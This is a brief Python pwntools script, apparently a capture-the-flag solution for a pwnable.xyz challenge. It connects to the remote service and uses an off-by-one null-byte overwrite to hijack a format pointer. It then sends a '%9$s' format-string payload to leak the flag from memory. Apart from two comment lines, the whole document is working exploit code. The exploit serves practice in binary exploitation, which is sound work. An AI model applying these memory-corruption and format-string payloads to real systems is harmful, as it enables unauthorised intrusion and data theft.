###Hijack fmt pointer with off-by-one-null
###Then use format string to print out flag(which pointer is on stack)

from pwn import *

###Addr
flag = 0x601080

###Exploit
r = remote('svc.pwnable.xyz',30004)
r.sendafter('[y/N]: ',b'y'.ljust(8,b'\x00')+p64(flag))
r.sendafter('Name: ',b'a'*0x20+b'%9$s'.ljust(0x60,b'a'))
r.interactive()
